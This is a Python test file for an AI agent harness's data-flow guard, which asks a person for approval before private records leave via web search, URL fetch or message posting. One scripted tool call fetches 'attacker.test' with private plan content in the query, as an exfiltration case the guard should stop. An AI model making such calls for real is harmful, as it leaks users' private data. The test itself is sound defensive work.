"""FLOWASK: the flow rule asks once per place a person can name, and only because of what the chat really read.

Seen on the human-test stack: a skill load made the chat "unknown", a web search could never be
allowed for the conversation, and pipeshub.com and docs.pipeshub.com were asked about separately. Asking at all after
a private read is the rule (FG2) and stays: these tests hold the asks to what a person can decide once.
"""

from __future__ import annotations

from typing import TYPE_CHECKING, cast

import pytest

from app.agents.actions.knowledge_graph.ops.fetch import FETCH_RECORD_TOOL_NAME
from app.harness.approvals import flow_guarded
from app.harness.citations import EVENT as CITATIONS_EVENT
from app.harness.flow_destination import pipeshub_destination, registrable_domain
from app.harness.labels import (
    SessionSourceLedger,
    inherited_grants,
    inherited_label,
    own_work_label,
    tool_kind,
)
from app.harness.unpinned import FLOW_ABOVE_ENV, FLOW_LEVEL_ENV, flow_rules
from app.utils.env_flags import HARNESS_FLOW_GUARD
from harness_core.contracts import validate_contract
from harness_core.contracts.generated.run_spec import RunSpec
from harness_core.contracts.generated.sink import SinkDescriptor
from harness_core.effects.flow import (
    MAX_INHERITED_GRANTS,
    ConversationGrants,
    GrantingLedger,
    destination_key,
    grants_from_wire,
    grants_wire,
)
from harness_core.effects.types import ToolEffect
from harness_core.journal.children import ChildGrantRequest
from harness_core.journal.types import (
    APPROVAL_REASONS,
    CHILD_LABELS,
    JournalEvent,
    NewEvent,
)
from harness_core.kernel.core.messages import ToolCall
from harness_core.kernel.durable import ToolExecution
from harness_core.kernel.durable.delegation import (
    DelegatingTool,
    NamedDelegation,
    goal_tool,
)
from harness_core.logs import HarnessLog
from harness_core.testing.run_spec import minimal_run_spec
from tests.unit.harness_core.durable.support import RUN, World, reply, scripted

if TYPE_CHECKING:
    from collections.abc import Mapping

    from pydantic import JsonValue

    from harness_core.kernel.durable import DurableKernel, ToolContext

LOG = HarnessLog.named("tests.flowask")
OUT = SinkDescriptor(egress="external", args_leave_boundary=True)
SEARCH = "dynamic__web_search"
FETCH = "dynamic__fetch_url"
SEARCH_EFFECT = ToolEffect("web@duckduckgo/web_search", "read", True, OUT)
FETCH_EFFECT = ToolEffect("web@duckduckgo/fetch_url", "read", True, OUT)
SKILL_EFFECT = ToolEffect("pipeshub@skills/load_skill", "read", True, SinkDescriptor(egress="none", args_leave_boundary=False))


@pytest.fixture(autouse=True)
def _defaults(monkeypatch: pytest.MonkeyPatch) -> None:
    for name in (HARNESS_FLOW_GUARD, FLOW_LEVEL_ENV, FLOW_ABOVE_ENV):
        monkeypatch.delenv(name, raising=False)


async def load_skill(args: Mapping[str, JsonValue], ctx: ToolContext) -> ToolExecution:
    return ToolExecution(status="ok", content={"name": args.get("name"), "body": "1. Check the docs site first."})


async def fetch_record(args: Mapping[str, JsonValue], ctx: ToolContext) -> ToolExecution:
    cited = {"records": {"r1": {"recordId": "rec-1", "connector": "CONFLUENCE", "recordName": "Q3 plan"}}}
    return ToolExecution(status="ok", content="Q3 plan", events=(NewEvent(CITATIONS_EVENT, cited, critical=False),))


async def web(args: Mapping[str, JsonValue], ctx: ToolContext) -> ToolExecution:
    return ToolExecution(status="ok", content={"results": []})


def _world() -> World:
    world = World(extension_writers={CITATIONS_EVENT: frozenset({"worker"})})
    world.tools.add("load_skill", load_skill, effect=SKILL_EFFECT)
    world.tools.add(FETCH_RECORD_TOOL_NAME, fetch_record, tags=[("category", "read")])
    world.tools.add(SEARCH, web, effect=SEARCH_EFFECT)
    world.tools.add(FETCH, web, effect=FETCH_EFFECT)
    world.admit()
    return world


def _kernel(world: World, *replies: object) -> DurableKernel:
    _, port = scripted(*replies)  # type: ignore[arg-type]
    ledger = GrantingLedger(SessionSourceLedger())
    approval = flow_guarded(
        lambda call, effect: "allow",
        ledger=ledger,
        run_id=RUN,
        log=LOG,
        rules=flow_rules(LOG),
        destination=pipeshub_destination,
        grants=ledger.grants,
    )
    return world.kernel(port, approval=approval, ledger=ledger)


SKILL = reply("", ("load_skill", {"name": "pipeshub-docs"}))
READ = reply("", (FETCH_RECORD_TOOL_NAME, {"recordId": "rec-1"}))


def search(query: str) -> object:
    return reply("", (SEARCH, {"query": query}))


def fetch(url: str) -> object:
    return reply("", (FETCH, {"url": url}))


def _explained(world: World) -> list[JournalEvent]:
    return world.events("interaction.explained")


def _open_ix(world: World) -> str:
    return str(world.events("interaction.requested")[-1].data["interactionId"])


def _ran(world: World, name: str) -> int:
    return sum(1 for tool, _ in world.tools.executed if tool == name)


# Root cause 1: a skill load is the agent's own configuration, not content of unknown origin.


@pytest.mark.parametrize("name", ["load_skill", "skills_list", "skill_search", "load_skill_resource", "list_toolsets"])
def test_skill_reads_and_tool_listing_carry_no_record_content(name: str) -> None:
    assert tool_kind(name) == "none"
    assert tool_kind(f"pipeshub@skills/{name}") == "none"


def test_authoring_a_skill_stays_opaque() -> None:
    assert tool_kind("skill_manage") == "opaque"


async def test_a_skill_load_then_a_web_search_is_public_and_never_asks() -> None:
    world = _world()
    done = await world.run(_kernel(world, SKILL, search("pipeshub pricing"), fetch("https://pipeshub.com"), reply("ok")))
    assert done.status == "completed"
    assert _explained(world) == []
    assert (_ran(world, SEARCH), _ran(world, FETCH)) == (1, 1)
    label = own_work_label(world.events(), RUN)
    assert (label.complete, label.sources) == (True, frozenset())


async def test_a_skill_load_beside_a_knowledge_read_asks_as_private_naming_the_record() -> None:
    world = _world()
    done = await world.run(_kernel(world, SKILL, READ, search("pipeshub pricing")))
    assert done.status == "suspended"
    [explained] = _explained(world)
    assert explained.data["sensitivity"] == "private"
    assert explained.data["sources"] == [{"title": "Q3 plan", "recordId": "rec-1"}]


# Root cause 2: a web search names its provider, so it can be allowed for the conversation.


def test_a_web_search_names_the_provider_its_tool_id_pins() -> None:
    call = ToolCall(id="c", name=SEARCH, arguments={"query": "anything at all"})
    found = pipeshub_destination(call, SEARCH_EFFECT)
    assert found is not None
    assert found.label == "DuckDuckGo"
    assert found.key == destination_key(SEARCH_EFFECT.tool_id, "provider=duckduckgo")
    other = pipeshub_destination(ToolCall(id="d", name=SEARCH, arguments={"query": "else"}), SEARCH_EFFECT)
    assert other == found
    serper = pipeshub_destination(call, ToolEffect("web@serper/web_search", "read", True, OUT))
    assert serper is not None and serper.label == "Serper" and serper.key != found.key


def test_a_search_provider_this_build_does_not_know_offers_no_grant() -> None:
    call = ToolCall(id="c", name=SEARCH, arguments={"query": "q"})
    assert pipeshub_destination(call, ToolEffect("web@default/web_search", "read", True, OUT)) is None
    assert pipeshub_destination(call, ToolEffect("web@unheard-of/web_search", "read", True, OUT)) is None


async def test_a_search_allowed_for_the_conversation_covers_the_next_search() -> None:
    world = _world()
    assert (await world.run(_kernel(world, READ, search("pipeshub")))).status == "suspended"
    [explained] = _explained(world)
    assert explained.data["conversationGrant"] is True
    assert explained.data["destination"]["label"] == "DuckDuckGo"  # type: ignore[index]
    world.journal.resolve_interaction(RUN, _open_ix(world), "approved", scope="conversation")
    done = await world.run(_kernel(world, search("pipeshub pricing"), reply("done")))
    assert done.status == "completed"
    assert _ran(world, SEARCH) == 2
    assert len(_explained(world)) == 1


# Root cause 3: a grant for a site covers its subdomains, never another site.


@pytest.mark.parametrize(
    ("host", "site"),
    [
        ("pipeshub.com", "pipeshub.com"),
        ("docs.pipeshub.com", "pipeshub.com"),
        ("DOCS.PipesHub.com.", "pipeshub.com"),
        ("a.x.co.uk", "x.co.uk"),
        ("foo.github.io", "foo.github.io"),
        ("bar.github.io", "bar.github.io"),
        ("127.0.0.1", "127.0.0.1"),
        ("localhost", "localhost"),
        ("intranet.unlistedsuffix", "intranet.unlistedsuffix"),
    ],
)
def test_the_site_is_the_registrable_domain(host: str, site: str) -> None:
    assert registrable_domain(host) == site


def _site_key(url: str) -> str | None:
    found = pipeshub_destination(ToolCall(id="c", name=FETCH, arguments={"url": url}), FETCH_EFFECT)
    return found.key if found is not None else None


def test_one_site_one_key_and_never_across_a_public_suffix() -> None:
    assert _site_key("https://pipeshub.com") == _site_key("https://docs.pipeshub.com/introduction")
    assert _site_key("https://pipeshub.com") != _site_key("https://pipeshub.com.attacker.test/")
    assert _site_key("https://foo.github.io/") != _site_key("https://bar.github.io/")
    assert _site_key("https://x.co.uk/") != _site_key("https://y.co.uk/")
    assert _site_key("http://[::1") is None
    found = pipeshub_destination(
        ToolCall(id="c", name=FETCH, arguments={"url": "https://docs.pipeshub.com/introduction"}), FETCH_EFFECT
    )
    assert found is not None and found.label == "pipeshub.com"


async def test_a_site_allowed_for_the_conversation_covers_its_docs_and_not_another_site() -> None:
    world = _world()
    assert (await world.run(_kernel(world, READ, fetch("https://pipeshub.com")))).status == "suspended"
    world.journal.resolve_interaction(RUN, _open_ix(world), "approved", scope="conversation")
    resumed = _kernel(world, fetch("https://docs.pipeshub.com/introduction"), fetch("https://attacker.test/?q=Q3"))
    assert (await world.run(resumed)).status == "suspended"
    assert _ran(world, FETCH) == 2
    assert [e.data["destination"]["label"] for e in _explained(world)] == ["pipeshub.com", "attacker.test"]  # type: ignore[index]


def test_a_grant_journaled_under_an_exact_host_key_stays_that_hosts_alone() -> None:
    """A conversation granted before sites were keyed by domain replays as it was: its offer still names its own key,
    which no new key equals, so the grant neither widens to the site nor breaks the fold; the next call asks again."""
    tool = FETCH_EFFECT.tool_id
    old = destination_key(tool, "url=docs.pipeshub.com")
    grants = ConversationGrants()
    events = [
        JournalEvent(
            org_id="o", session_id="s", stream_id="s", seq=seq, run_id="r", type=kind, critical=False,
            ts="2026-10-20T00:00:00Z", writer=writer, data=data,  # type: ignore[arg-type]
        )
        for seq, (kind, writer, data) in enumerate(
            [
                (
                    "interaction.explained",
                    "worker",
                    {"interactionId": "ix.approve.1", "toolId": tool, "conversationGrant": True,
                     "destination": {"label": "docs.pipeshub.com", "key": old}},
                ),
                ("interaction.resolved", "node", {"interactionId": "ix.approve.1", "decision": "approved"}),
                ("interaction.granted", "node", {"interactionId": "ix.approve.1", "scope": "conversation"}),
            ],
            start=1,
        )
    ]
    grants.apply(events)
    assert grants.allows(tool, old)
    new = _site_key("https://docs.pipeshub.com/introduction")
    assert new is not None and new != old
    assert not grants.allows(tool, new)
    assert not grants.allows(tool, destination_key(tool, "url=pipeshub.com"))


# Root cause 4: a child journals on its own stream; it holds the grants its parent held when it asked for it.

EXT: dict[str, JsonValue] = {
    "knowledge": {"apps": [], "kb": [], "strictScope": False},
    "mcp": [],
    "skills": [],
    "mounts": [],
    "via": "session",
}
DELEGATE = reply("", ("delegate", {"goal": "write it up and post it"}))


def post(channel: str) -> object:
    return reply("", ("post_message", {"channel": channel, "text": "Q3 plan"}))


def _posts(world: World) -> list[object]:
    return [e.payload.get("channel") for e in world.saas.effects if e.op == "post_message"]


def _parent_world(**journal: object) -> World:
    world = World(extension_writers={CITATIONS_EVENT: frozenset({"worker"})}, **journal)  # type: ignore[arg-type]
    world.tools.add(FETCH_RECORD_TOOL_NAME, fetch_record, tags=[("category", "read")])
    spec = minimal_run_spec(max_children=2).model_copy(update={"extensions": {"x.pipeshub": EXT}})
    world.admit(spec=validate_contract(RunSpec, spec.model_dump(mode="json", by_alias=True, exclude_none=True)))
    return world


def _family_kernel(
    world: World, *replies: object, run_id: str = RUN, spec: RunSpec | None = None, inherit_grants: bool = True
) -> DurableKernel:
    _, port = scripted(*replies)  # type: ignore[arg-type]
    held = inherited_grants(spec) if spec is not None and inherit_grants else ConversationGrants()
    ledger = GrantingLedger(SessionSourceLedger(inherited=inherited_label(spec) if spec is not None else None), held)
    approval = flow_guarded(
        lambda call, effect: "allow",
        rules=flow_rules(LOG),
        ledger=ledger,
        run_id=run_id,
        log=LOG,
        destination=pipeshub_destination,
        grants=ledger.grants,
    )
    delegate = DelegatingTool(goal_tool("delegate", "Hand a task over"), ChildGrantRequest())
    return world.kernel(
        port, approval=approval, ledger=ledger, children=world.journal, delegation=NamedDelegation({"delegate": delegate})
    )


def _child_spec(world: World) -> tuple[str, RunSpec]:
    (child,) = world.journal.children_of(RUN)
    pinned = next(e for e in world.journal.events(child) if e.type == "run.spec_pinned")
    return child, validate_contract(RunSpec, cast("dict[str, JsonValue]", pinned.data["spec"]))


async def _granted_parent_then_child(world: World) -> tuple[str, RunSpec]:
    assert (await world.run(_family_kernel(world, READ, post("sales")))).status == "suspended"
    world.journal.resolve_interaction(RUN, _open_ix(world), "approved", scope="conversation")
    assert (await world.run(_family_kernel(world, DELEGATE, reply("done")))).reason == "join"
    return _child_spec(world)


async def test_a_grant_given_in_the_parent_covers_the_same_place_in_its_child() -> None:
    world = _parent_world()
    child, spec = await _granted_parent_then_child(world)
    assert _posts(world) == ["sales"]
    [offer] = _explained(world)
    destination = cast("dict[str, JsonValue]", offer.data["destination"])
    assert inherited_grants(spec).held() == {(str(offer.data["toolId"]), str(destination["key"]))}
    run = _family_kernel(world, post("sales"), post("general"), reply("posted"), run_id=child, spec=spec)
    assert (await world.run(run, child)).status == "suspended"
    assert _posts(world) == ["sales", "sales"]
    [asked] = [e for e in world.journal.events(child) if e.type == "interaction.explained"]
    assert asked.data["destination"]["label"] == "#general"  # type: ignore[index]


async def test_without_the_pin_the_child_asked_again_where_the_parent_was_allowed() -> None:
    """The control, as the owner saw it: the child's own stream holds no grant."""
    world = _parent_world()
    child, spec = await _granted_parent_then_child(world)
    run = _family_kernel(world, post("sales"), reply("posted"), run_id=child, spec=spec, inherit_grants=False)
    assert (await world.run(run, child)).status == "suspended"
    assert _posts(world) == ["sales"]


async def test_an_older_journal_gets_no_grants_and_the_child_asks_as_before(caplog: pytest.LogCaptureFixture) -> None:
    caplog.set_level("INFO")
    world = _parent_world(journal_accepts=frozenset({APPROVAL_REASONS, CHILD_LABELS}))
    _, spec = await _granted_parent_then_child(world)
    assert inherited_grants(spec).held() == frozenset()
    assert "child.grants_withheld" in caplog.text


async def test_a_parent_that_holds_no_grant_pins_none() -> None:
    world = _parent_world()
    assert (await world.run(_family_kernel(world, DELEGATE, reply("done")))).reason == "join"
    _, spec = _child_spec(world)
    assert "inheritedGrants" not in cast("dict[str, JsonValue]", (spec.extensions or {})["x.pipeshub"])


def test_grants_on_the_wire_are_sorted_bounded_and_read_back() -> None:
    tool = FETCH_EFFECT.tool_id
    held = {(tool, destination_key(tool, f"url=site{i}.com"), "private") for i in range(MAX_INHERITED_GRANTS + 44)}
    wire = grants_wire(held)
    assert len(wire) == MAX_INHERITED_GRANTS
    assert wire == grants_wire(sorted(held, reverse=True))
    assert grants_from_wire(wire) <= held
    assert grants_from_wire([{"toolId": "t"}, "x", {"toolId": "", "key": "k"}]) == frozenset()
    assert grants_from_wire(None) == frozenset()
    # FLOWGRANT: a pin from before grants named their data holds as it did; a ceiling nobody knows grants nothing.
    assert grants_from_wire([{"toolId": "t", "key": "k"}]) == {("t", "k", "private")}
    assert grants_from_wire([{"toolId": "t", "key": "k", "sensitivity": "secret"}]) == frozenset()
